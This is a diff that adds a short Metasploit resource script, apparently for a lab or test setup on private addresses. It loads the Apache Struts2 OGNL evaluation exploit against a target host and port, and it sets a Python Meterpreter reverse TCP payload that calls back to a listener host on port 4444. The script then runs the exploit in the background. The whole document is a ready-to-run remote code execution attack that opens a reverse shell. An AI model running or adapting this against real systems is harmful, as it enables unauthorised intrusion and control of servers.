@@ -1,0 +1,11 @@
+sessions -K
+use exploit/multi/http/struts2_multi_eval_ognl
+set rhosts 192.168.33.238
+set rport 18080
+set payload cmd/unix/python/meterpreter/reverse_tcp
+set srvhost 0.0.0.0
+set srvport 18080
+set lhost 192.168.33.241
+set lport 4444
+set target 1
+run -z
